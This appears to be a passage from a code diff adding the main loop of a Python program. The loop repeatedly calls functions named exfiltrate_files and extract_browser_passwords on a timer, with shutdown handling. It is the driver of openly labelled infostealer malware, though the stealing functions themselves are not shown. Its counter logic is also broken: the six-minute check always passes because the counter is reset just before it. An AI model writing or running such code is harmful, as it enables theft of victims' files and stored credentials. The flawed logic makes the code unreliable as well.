+    # File exfiltration happens periodically
+    exfiltration_count = 0
+    while not shutdown_flag.is_set():
+        time.sleep(60)  # Check every minute
+        
+        exfiltration_count += 1
+        if exfiltration_count >= 3:  # Every 3 minutes
+            exfiltrate_files()
+            exfiltration_count = 0
+            
+            # Re-extract passwords periodically
+            if exfiltration_count % 6 == 0:  # Every 6 minutes
+                extract_browser_passwords()
+    
+    print("🛑 Monitoring stopped")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        shutdown_flag.set()
+        print("\n🛑 Stopped by user")
+    except Exception as e:
+        print(f"\n❌ Error: {e}")
+        shutdown_flag.set()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
